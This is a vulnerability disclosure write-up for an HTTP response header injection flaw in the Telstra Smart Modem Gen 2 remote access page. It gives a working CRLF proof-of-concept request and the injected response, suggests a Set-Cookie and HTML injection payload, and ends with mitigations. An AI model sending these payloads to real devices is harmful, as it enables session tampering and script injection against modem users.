# Telstra-RHI
A vulnerability was recently discovered in the HTTP(S) remote access webpage for the Telstra Smart Modem Gen 2. This vulnerability allows for unauthenticated HTTP Response Header Injection, giving attackers the ability to manipulate HTTP headers and potentially inject malicious payloads into server responses. The issue is caused by user-supplied data being unsafely copied into the Content-Disposition response header without proper validation or sanitization. The vulnerability was demonstrated by sending a specially crafted HTTP GET request to the server, targeting the robots.txt resource with a malicious payload embedded in the URL path:<br/>

"""<br/>
GET /robots.txtcy4y9%0d%0ai3o0z HTTP/1.1<br/>
Host: *.***.**.***<br/>
Accept-Encoding: gzip, deflate, br<br/>
Accept: */*<br/>
Accept-Language: en-US;q=0.9,en;q=0.8<br/>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36<br/>
Connection: close<br/>
Cache-Control: max-age=0<br/>
"""<br/>

This request appends the payload 'cy4y9%0d%0ai3o0z' to the resource path in the URL. The %0d%0a sequence breaks out of the expected header structure, allowing for the injection of new headers or manipulation of the response body. The server then processed the request and returned the following malformed response:<br/>

"""<br/>
HTTP/1.1 302 Found<br/>
Server: nginx/1.15.10<br/>
Date: Mon, 13 Jan 2025 04:30:25 GMT<br/>
Content-Type: text/html<br/>
Content-Length: 0<br/>
Connection: close<br/>
Content-Disposition: attachment; filename=robots.txtcy4y9<br/>
i3o0z: <br/>
Location: /relogin.htm<br/>
X-XSS-Protection: 1; mode=block<br/>
X-Content-Type-Options: nosniff<br/>
X-Permitted-Cross-Domain-Policies: none<br/>
X-Frame-Options: SAMEORIGIN<br/>
Access-Control-Allow-Origin: http://mymodem.gateway:85<br/>
"""<br/>

In this response, the Content-Disposition header is constructed with the user-supplied value robots.txtcy4y9, but the %0d%0a sequence terminates this header prematurely. This results in the creation of a new, invalid header: 'i3o0z:'. By including additional payloads beyond the %0d%0a, an attacker could inject arbitrary HTTP headers or even initiate the response body with crafted content. For example, inserting %0d%0aSet-Cookie: sessionid=malicious%0d%0a%0d%0a<html> could set a malicious cookie and inject HTML or JavaScript into the response body.

Attempts have been made to contact Telstra Support about this vulnerability, however no reply was received.<br/>
Strategies to mitigate this vulnerability have been listed below:
- Confirm that all user-supplied input is sanitized before being incorporated into HTTP headers.
- Reject all input that contains control characters or other unsafe combinations.
- Encode user input to neutralize special characters before including it in headers.
